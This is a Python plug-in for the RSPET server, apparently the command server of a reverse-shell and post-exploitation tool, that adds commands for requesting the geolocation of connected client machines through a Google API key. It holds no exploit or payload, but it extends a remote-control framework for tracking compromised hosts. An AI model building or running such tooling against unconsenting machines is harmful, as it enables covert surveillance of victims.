"""
Plug-in module for RSPET server. Offer Client Geolocation functionalities.
"""
import time
from socket import error as sock_error
from rspet.server.Plugins.mount import command, installer


@command("basic", "connected", "multiple")
def geolocation_config(server, args):
    """ Provide Google API key for the Geolocation service.

    Help: <API-Key>"""
    ret = [None, 0, ""]
    if len(args) < 1:
        ret[2] = ("Syntax : %s" % server.commands["geolocation_config"].__syntax__)
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        server.config["geo-api"] = args[0]
    return ret


@command("connected", "multiple")
def geo_init(server, host, args):
    """Initialize the Geolocation plugin on the selected client(s).

    Help: """
    ret = [None, 0, ""]
    try:
        en_data = host.recv()
    except sock_error:
        raise sock_error
    if en_data == 'psi':
        host.info["commands"].append("get_location")
    else:
        ret[2] = "Error Initializing the plugin on the client."
    return ret


@command("connected", "multiple")
def get_location(server, host, args):
    """ Request Geolocation information from selected host(s).

    Help: """
    ret = [None, 0, ""]
    try:
        key = server.config["geo-api"]
    except KeyError:
        ret[2] = "Plugin configuration missing. See Plugin documentation."
        ret[1] = 1  # Invalid Syntax Error Code
    else:
        host.send(key)
        time.sleep(2)
        reply = host.recv()
        ret[2] = reply
    return ret


@installer(__name__)
def setup(app, commands):
    pass
